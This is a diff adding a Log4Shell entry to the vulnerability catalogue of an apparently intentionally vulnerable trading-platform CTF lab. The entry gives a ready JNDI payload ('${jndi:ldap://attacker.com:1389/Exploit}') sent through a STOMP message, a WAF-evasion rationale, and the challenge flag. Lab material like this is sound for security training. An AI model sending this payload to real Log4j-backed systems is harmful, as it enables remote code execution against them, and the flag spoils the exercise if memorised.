@@ -181,3 +181,32 @@ sendMessage('/app/admin.setPrice', { symbol: 'VULN', price: 99999 });
 | Endpoint | STOMP `/app/admin.haltTrading`, `/app/admin.resumeTrading` |
 
 **Description:** Any user can halt and resume trading for any symbol. During a halt, they can accumulate orders, then resume trading to execute them.
+
+---
+
+### WS-11: Log4Shell (CVE-2021-44228) via STOMP Messages
+| Field | Value |
+|-------|-------|
+| Severity | Critical (CVSS 10.0) |
+| OWASP | A03: Injection + A06: Vulnerable Components |
+| CWE | CWE-917 |
+| CVE | CVE-2021-44228 |
+| Difficulty | Advanced |
+| Endpoints | `/app/admin.haltTrading` (reason), `/app/admin.adjustBalance` (reason), `/app/trade.setAlert` (symbol) |
+| Files | `AdminService.java:97,73`, `AlertService.java:53` |
+
+**Description:** The backend uses Log4j2 2.14.1 and logs user-controlled input from STOMP messages without sanitization. Injecting `${jndi:ldap://attacker/Exploit}` in the `reason` field of halt/balance operations triggers JNDI lookup resolution → remote class loading → RCE.
+
+**Why WebSocket makes this worse:** WAFs inspect HTTP traffic but cannot see inside STOMP frames. Log4Shell payloads delivered via WebSocket bypass every network-level defense.
+
+**Quickest trigger:**
+```javascript
+sendMessage('/app/admin.haltTrading', {
+  symbol: 'AAPL',
+  reason: '${jndi:ldap://attacker.com:1389/Exploit}'
+});
+```
+
+**Flag:** `FLAG{l0g4sh3ll_rc3_tr4d1ng_pl4tf0rm}` — read `/opt/flags/flag_log4shell.txt` after achieving RCE.
+
+See [03-injection.md#inj-11](03-injection.md#inj-11-log4shell-cve-2021-44228-via-websocket) for the full exploitation walkthrough with marshalsec setup.
